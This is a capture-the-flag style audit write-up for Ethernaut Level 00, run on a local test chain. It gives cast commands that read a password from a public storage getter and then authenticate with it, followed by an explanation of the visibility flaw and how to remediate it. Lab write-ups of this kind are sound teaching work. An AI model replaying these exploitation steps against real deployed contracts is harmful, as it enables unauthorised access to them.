** 🛡️ Web3 Smart Contract Audits & Exploitation Reports

This module documents the security assessment, vulnerability discovery, and cryptographic exploitation of Ethereum smart contracts within an isolated homelab cyber range utilizing Anvil, Forge, and Cast.

---

** 📄 Level 00: Hello Ethernaut

*** 1. Objective
Identify the required access vectors to interface with the `Instance.sol` deployment instance, bypass the logic-gate information tracking array, flip the tracking state to `cleared = true`, and successfully authenticate against the contract.

*** 2. Exploitation Commands (PoC)
```bash
* Phase 1: Sniff the public storage slot to extract the unencrypted passcode
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "password()(string)" --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545)

* Phase 2: Execute authentication payload utilizing the leaked credential
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 "authenticate(string)" "ethernaut_pass_123" --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

* Phase 3: Verify the validation state change
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "getCleared()(bool)" --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545)

* Summary of Findings

The contract exhibited an Information Disclosure / Improper Data Visibility flaw. The developer declared the sensitive string configuration state variable using public visibility: string public password;. This auto-generates a public getter function on the Ethereum Virtual Machine (EVM), allowing anyone to read the plaintext string directly from the state layer without restriction.

* Lessons Learned & Remediation

    Public Ledger Visibility: Blockchains are inherently public structures. Marking variables as private or public only changes runtime accessibility for other contracts; it never encrypts or hides data from off-chain analysis.

    Remediation: Sensitive data, credentials, or administrative passcodes should never be stored raw on-chain. Verification states should rely on cryptographic hash commitments (e.g., keccak256) or zero-knowledge validation architecture.
